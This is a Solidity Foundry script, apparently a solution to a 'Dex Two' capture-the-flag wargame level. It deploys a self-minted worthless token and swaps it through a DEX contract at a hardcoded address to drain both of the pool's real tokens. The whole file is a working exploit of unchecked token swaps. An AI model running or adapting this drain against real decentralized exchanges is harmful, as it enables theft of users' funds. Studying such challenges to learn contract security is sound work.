//SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {DexTwo} from "../src/DexTwo.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoScript is Script {
    DexTwo public dexTwo;
    Token3 public token3;

    function run() external {
        dexTwo = DexTwo(0xAeaF4A53121a5Ac8AAECAea6B6E767a9d759Ad1b);
        pwn();
    }

    function pwn() public {
        address dexTwoAddress = 0xAeaF4A53121a5Ac8AAECAea6B6E767a9d759Ad1b;
        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();

        vm.startBroadcast();
        token3 = new Token3();

        token3.approve(dexTwoAddress, 400);
        token3.transfer(dexTwoAddress, 100);

        dexTwo.swap(address(token3), token1, 100);
        dexTwo.swap(address(token3), token2, 200);

        vm.stopBroadcast();
    }
}

contract Token3 is ERC20 {
    constructor() ERC20("Token3", "T3") {
        _mint(msg.sender, 1000000 * 10 ** decimals());
    }
}
